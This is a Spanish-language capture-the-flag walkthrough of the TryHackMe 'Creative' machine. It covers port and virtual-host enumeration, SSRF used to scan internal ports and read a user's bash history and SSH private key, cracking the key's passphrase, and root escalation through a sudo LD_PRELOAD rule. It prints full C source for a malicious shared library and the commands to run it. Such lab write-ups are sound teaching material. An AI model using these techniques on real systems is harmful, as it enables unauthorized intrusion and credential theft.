# TryHackMe Rooms

## "Creative" - Spanish Walkthrough

### Configuración

Se configuró el archivo **/etc/hosts** como es habitual, añadiendo una nueva entrada para la dirección IP asignada por TryHackMe a la máquina objetivo, y a su vez un nombre de dominio sencillo.

```sudo echo "<IP del objetivo> creative.thm" >> /etc/hosts```

### Fase de reconocimiento

Se llevó a cabo un reconocimiento inicial de la máquina objetivo mediante escaneo de puertos abiertos. Para esta primera interacción, se utilizaron switches de Nmap típicos tales como:

- Descubrimiento de servicios y versiones en ejecución
- Descubrimiento de sistemas operativos
- Scripts de Nmap por defecto
- Rango completo de puertos TCP

Se adjunta a continuación el comando utilizado.

```nmap -sV -sC -O -p- creative.thm```

En la imagen siguiente se ilustran los resultados obtenidos.

![alt text](<Imagenes/1 Escaneo con Nmap.png>)

- _El uso del switch **-p-** corresponde a un 2do escaneo, donde se buscó confirmar si los puertos en escucha eran solamente aquellos mostrados en la imagen_

El reporte informó como abiertos los puertos **22** (SSH) y **80** (HTTP). Para este 2do puerto, se llevó a cabo reconocimiento manual mediante el navegador, accediendo a la página web que en dicho puerto se sirve.

![alt text](<Imagenes/2 Sitio web principal.png>)

Paralelamente a esto, se enumeraron directorios con **FFUF**. Se adjuntan a continuación comandos utilizados y resultados obtenidos.

```ffuf -u http://creative.thm:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic | tee ffuf_scan.txt```

![alt text](<Imagenes/3 Enumeración de directorios con FFUF.png>)

```ffuf -u http://creative.thm:80/assets/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic | tee ffuf_scan_assets.txt```

![alt text](<Imagenes/4 Enumeración al directorio assets.png>)

- _Se recomienda redirigir los escaneos a archivos de texto para facilitar el análisis posterior_

### Enumeración de dominios y subdominios

Dado que la información hasta este punto recolectada no conformaba una superficie de ataque lo suficientemente grande, se determinó como siguiente paso la enumeración de subdominios o "Virtual Hosts" que pudieran existir, los cuales no habrían sido alcanzados por la enumeración inicial.
Nuevamente, se utilizó FFUF, aplicando el correspondiente switch **-H** para indicarle a la herramienta que se deberán _fuzzear_ subdominios. La primera prueba fue ejecutada sin filtros de tamaño, cantidad de palabras o códigos de estado. Esto fue así porque se buscó determinar patrones repetidos en las distintas respuestas obtenidas para luego volver a ejecutar la prueba utilizando filtros que permitieran descartar falsos positivos o resultados irrelevantes.
En la línea siguiente se adjunta el comando completo utilizado para la 1er prueba.

```ffuf -u http://creative.thm:80 -H "Host: FUZZ.creative.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic```

La ejecución de esta prueba reveló un patrón de comportamiento, el cual se muestra a continuación.

![alt text](<Imagenes/5 Prueba de enumeración de subdominios.png>)

Una vez confirmado el patrón de respuesta del servidor, se ejecutó nuevamente el comando especificando además un filtro por tamaño de respuesta.

```ffuf -u http://creative.thm:80 -H "Host: FUZZ.creative.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic -fs 178```

![alt text](<Imagenes/6 Subdominio encontrado.png>)

Se confirmó la existencia de un subdominio hasta ahora desconocido en el servidor. Para interactuar correctamente con él, se editó el archivo **/etc/hosts** para que la IP de la máquina objetivo apuntara también a este nuevo subdominio.
Llevado a cabo el paso anterior de configuración, se accedió mediante el navegador a la URL, lo cual concluyó en el descubrimiento de una página de pruebas.

![alt text](<Imagenes/7 Página encontrada en el nuevo subdominio.png>)

### Investigación y comportamiento en la página de testing

La página encontrada tiene como finalidad verificar la existencia de una URL dada, la cual se ingresa como parámetro en el campo de texto. A fin de comprobar qué comportamiento ejercía y qué alcance tenía, se llevó a cabo como prueba la creación de un archivo de texto en la máquina atacante, para luego exponerlo a la red mediante un servidor HTTP temporal con Python. Por último, se especificó la URL de dicho recurso en el campo de búsqueda, y se comprobó que el servidor imprime en pantalla el contenido de prueba. Esto confirmó que el servidor es vulnerable a ataques del tipo [Server-Side Request Forgery](https://en.wikipedia.org/wiki/Server-side_request_forgery).

```echo "whoami" > test.txt```

```python3 -m http.server 80```

![alt text](<Imagenes/8 Prueba con URL dentro de la maquina atacante.png>)

![alt text](<Imagenes/9 Prueba con URL dentro de la maquina atacante.png>)

Una vez confirmada la vulnerabilidad, se llevó a cabo un nuevo intento de ataque mediante FFUF, encadenando solicitudes POST al endpoint descubierto y aplicando como **payload** distintos números correspondientes a puertos consecutivos. La finalidad de este procedimiento fue determinar si la máquina ejecutaba servicios o aplicaciones de manera local que fuesen invisibles desde la red externa.
Al igual que el caso anterior, primero se ejecutó el ataque sin aplicar filtrado para determinar patrones de respuesta repetidos.

```ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w /usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt -H "Content-Type: application/x-www-form-urlencoded"```

![alt text](<Imagenes/10 Patron de respuesta repetido.png>)

Como se puede apreciar, luego del primer intento se confirmó que debía filtrarse la salida para omitir respuestas con tamaño **13**.

```ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w /usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt -H "Content-Type: application/x-www-form-urlencoded" -fs 13```

![alt text](<Imagenes/11 Puerto encontrado en la maquina objetivo.png>)

Y finalmente, al filtrar los resultados por tamaño, la herramienta obtuvo coincidencias para el valor **01337**. Luego, al introducir manualmente la URL correspondiente a dicho puerto en la página de prueba, se redirige al listado de directorios interno del servidor.

![alt text](<Imagenes/12 Listado de directorios en el puerto 1337.png>)

### Bandera user.txt

A partir de este hallazgo, se listó paso a paso el directorio **/home** para descubrir la ubicación de la primer bandera.

![alt text](<Imagenes/13 Directorio home.png>)

![alt text](<Imagenes/14 Directorio saad.png>)

### Descubrimiento de credenciales filtradas y claves privadas

Una vez encontrada la primer bandera, se dio paso al reconocimiento interno de la máquina objetivo. A fin de obtener información de manera precisa, esta fase se llevó a cabo usando OWASP ZAP, enviando manualmente solicitudes a través del proxy que monta la herramienta.
Fue a través de este procedimiento, que se envió una primer solicitud POST para intentar leer el contenido del archivo **.bash_history** del usuario **saad**. Esto fue determinante, ya que el historial de comandos reveló que dicho usuario realizó operaciones relacionadas con **MySQL**, **sudo**, así como también la creación de un archivo de nombre "creds.txt" con una **contraseña** en texto plano, legible en el historial.
A continuación se adjunta una imagen ilustrativa.

![alt text](<Imagenes/15 Historial del usuario saad.png>)

Luego de obtener este primer dato, y siguiendo el mismo procedimiento, se listó el contenido del directorio **.ssh** del usuario. Esto último fue la clave para acceder por terminal al servidor, ya que fue posible obtener la **clave privada** en texto plano a través de la response.

![alt text](<Imagenes/16 Clave privada de saad.png>)

Finalmente, el texto de la clave fue copiado a un archivo local y configurado con los permisos necesarios. Luego, se descubrió que dicha clave se encuentra protegida por una _passphrase_.

![alt text](<Imagenes/17 Clave protegida por passphrase.png>)

Utilizando ```ssh2john```, se generó un archivo compatible con John the Ripper a partir de la clave original, a fin de descifrarla mediante fuerza bruta. Se adjunta a continuación el comando utilizado.

```ssh2john id_rsa_saad > id_rsa_saad_for_john```

Realizando la comparativa contra la lista de palabras **rockyou.txt**, fue posible encontrar la _passphrase_ de la clave, y conectar una shell como saad en el servidor.

![alt text](<Imagenes/18 Passphrase descifrada.png>)

![alt text](<Imagenes/19 Shell SSH conectada exitosamente.png>)

### Permisos del usuario "saad"

Utilizando la contraseña filtrada en el historial de comandos de saad, fue posible listar binarios ejecutables como **sudo** por dicho usuario.

![alt text](<Imagenes/20 Permisos del usuario saad.png>)

### Análisis de vulnerabilidad y escalación de privilegios

Acorde a la salida anteriormente mostrada, se visualiza que el usuario saad puede ejecutar el binario **/usr/bin/ping** con permisos de root. Y, particularmente en este caso, reviste suma importancia la configuración **env_keep=LD_PRELOAD**.
LD_PRELOAD es una variable de entorno especial en Linux que configura a la librería dinámica (glibc) para que cargue una **librería compartida** (.so) específica antes de cargar las demás.
Esto significa que la combinación ```(root) /usr/bin/ping + env_keep+=LD_PRELOAD``` sugiere una escalada de privilegios mediante vinculación dinámica.
En palabras sencillas, el proceso que seguirá el sistema será el siguiente: al invocar al binario ping con permisos de sudo, se cargarán las librerías compartidas desde la ruta estándar. Si fuese posible conseguir que se cargue una librería maliciosa antes que las demás, la misma podría sobreescribir funciones nativas como ```system```, ```execve```, etc.

### Creación de librería maliciosa

Para explotar esta vulnerabilidad, se usó una directiva de **constructor**, la cual se adjunta a continuación:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");  
    setuid(0);               
    system("/bin/bash");     
}
```

El proceso seguido por el código mostrado es el siguiente:

- ```__attribute__((constructor))```: es el _core_ del ataque, se encargará de ejecutar la función apenas se cargue la librería por parte del binario **ping**.
- ```unsetenv```: tiene como tarea **eliminar** la variable LD_PRELOAD. Esto a fin de evitar que la nueva consola Bash intente cargar de nuevo la librería, creando un bucle que sature la terminal.
- ```setuid(0)```: asume automáticamente la identidad del usuario **sudo**.
- ```system("/bin/bash");```: es la línea que abrirá la consola interactiva final con los privilegios máximos.

Fue así que en la raíz del directorio del usuario saad se creó un nuevo archivo con el código anterior, como se muestra en la imagen.

![alt text](<Imagenes/21 Creacion de libreria maliciosa.png>)

El paso siguiente fue compilarlo para utilizarlo como librería compartida, tomando en cuenta qué:

- Deberá poder cargarse en **cualquier** posición de memoria
- Tendrá que ser una librería **compartida** en lugar de un ejecutable tradicional

Se adjunta el comando completo utilizado.

```gcc -fPIC -shared -o shell.so shell.c```

Una vez completados todos estos pasos, se explotó la vulnerabilidad invocando al binario **ping** autorizado a correr con permisos de administrador, especificando la librería creada.

```sudo LD_PRELOAD=./shell.so /usr/bin/ping 127.0.0.1```

![alt text](<Imagenes/22 Shell como root obtenida.png>)

Y ya con privilegios máximos obtenidos, se obtuvo la última bandera, completando la sala.

![alt text](<Imagenes/23 Bandera root obtenida.png>)
